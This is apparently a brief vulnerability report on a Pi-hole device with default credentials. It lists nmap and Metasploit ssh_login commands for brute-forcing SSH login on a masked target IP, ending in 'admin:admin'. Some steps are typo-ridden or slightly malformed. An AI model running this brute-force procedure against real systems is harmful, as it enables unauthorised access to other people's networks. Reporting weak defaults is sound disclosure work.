Title:
Pi hole standard login details (default) alowing external users quickly find access to local network
Pi-hole ( http://***.***.*.***/admin/login.php )
Vuerneability was found using Brute Force Attack in Metasploit 
Description:
User left default login and password to his device that allows external users gain easy access

Steps to recreate:

1. NMAP scan to get the list of open ports on the target machine:
      $ nmap -sS -sV ***.***.*.*** (the IP address of the target machine)
2. From displayed list we will see a port 22/tcp that is running ssh service with debian version 12.5
3. Open msfconsole on Kali Machine
   search for ssh_login auxiliaries by using search command  ( Search ssh)
   use auxiliary/scanner/ssh/ssh_login from the results : msf6 > use auxiliary/scanner/ssh/ssh_login
   check options available to set our target: msf6 > (auxiliary/scanner/ssh/ssh_login) > show options 
   on the displayed list we see list of available attacks 
4. Set the attack:
       set RHOST ***.***.*.***
       set THREADS 3
       set STOP_ON_SUCCESS true
       set VERBOSE true
after setting up all the option I am using password list as the program is missing one.
set USERPASS_FILE set https://www.ncsc.gov.uk/static-assets/documents/PwnedPasswordsTop100k.txt
5. after selecting run command will start brute forcing into the system
   once the password and login is found we will get  message: Success admin:admin
